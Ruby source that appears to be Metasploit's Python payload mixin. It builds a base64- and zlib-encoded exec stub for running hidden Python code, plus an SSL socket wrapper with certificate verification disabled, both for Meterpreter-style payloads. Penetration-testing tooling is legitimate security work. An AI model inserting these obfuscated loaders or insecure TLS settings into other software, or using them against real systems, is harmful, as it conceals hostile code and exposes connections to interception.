# -*- coding: binary -*-

module Msf::Payload::Python
  # Mark the payload as dynamic, as the zlib compression with a single char change can lead to size changes even if the original payload is the same length
  ForceDynamicCachedSize = true

  #
  # Encode the given python command in base64 and wrap it with a stub
  # that will decode and execute it on the fly. The code will be condensed to
  # one line and compatible with all Python versions supported by the Python
  # Meterpreter stage.
  #
  # @param python_code [String] The python code to execute.
  # @return [String] Full python stub to execute the command.
  #
  def self.create_exec_stub(python_code)
    # Encoding is required in order to handle Python's formatting
    payload = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_code))
    b64_stub = "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{payload}')[0])))"
    b64_stub
  end

  def py_create_exec_stub(python_code)
    Msf::Payload::Python.create_exec_stub(python_code)
  end

  # Generate a three-line Python snippet that wraps +in_var+ (a raw socket) into an SSL socket
  # stored in +out_var+, compatible with Python 2.6 through 3.14+.
  #
  # The snippet is self-contained: it begins with its own `import ssl` so callers need not
  # import ssl under any particular name. Python's import machinery makes redundant imports
  # a no-op, and `import` is valid at any indentation level.
  #
  # Uses ssl.wrap_socket when available (Python 2.6–3.11), falling back to SSLContext with a
  # getattr chain for the protocol constant (Python 3.12+ where wrap_socket was removed).
  # The SSLContext setup runs inside an immediately-invoked lambda so no temporary variable
  # leaks into the surrounding payload namespace.
  #
  # @param in_var [String] name of the raw socket variable
  # @param out_var [String] name to assign the SSL socket to (defaults to in_var)
  # @param indent [String] prefix for each generated line (e.g. "\t\t" inside a retry loop)
  # @return [String] three-line Python snippet ending with a newline
  def self.ssl_wrap_socket_stub(in_var, out_var = nil, indent: '')
    out_var ||= in_var
    "#{indent}import ssl\n" \
    "#{indent}try:#{out_var}=ssl.wrap_socket(#{in_var})\n" \
    "#{indent}except:#{out_var}=(lambda c:(setattr(c,'check_hostname',False),setattr(c,'verify_mode',ssl.CERT_NONE),c.wrap_socket(#{in_var}))[-1])(ssl.SSLContext(getattr(ssl,'PROTOCOL_TLS_CLIENT',getattr(ssl,'PROTOCOL_TLS',ssl.PROTOCOL_SSLv23))))\n"
  end

  def py_ssl_wrap_socket(in_var, out_var = nil, indent = '')
    Msf::Payload::Python.ssl_wrap_socket_stub(in_var, out_var, indent: indent)
  end

end
